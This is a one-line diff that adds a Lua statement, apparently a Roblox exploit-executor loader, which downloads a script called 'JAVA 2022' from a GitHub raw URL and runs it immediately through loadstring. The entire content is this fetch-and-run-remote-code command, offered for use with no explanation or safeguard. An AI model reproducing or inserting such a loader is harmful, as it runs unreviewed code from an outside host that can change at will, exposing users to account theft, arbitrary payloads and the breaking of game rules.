@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qrrjjjjjjj/JAVA-2022/main/JAVA%202022"))()
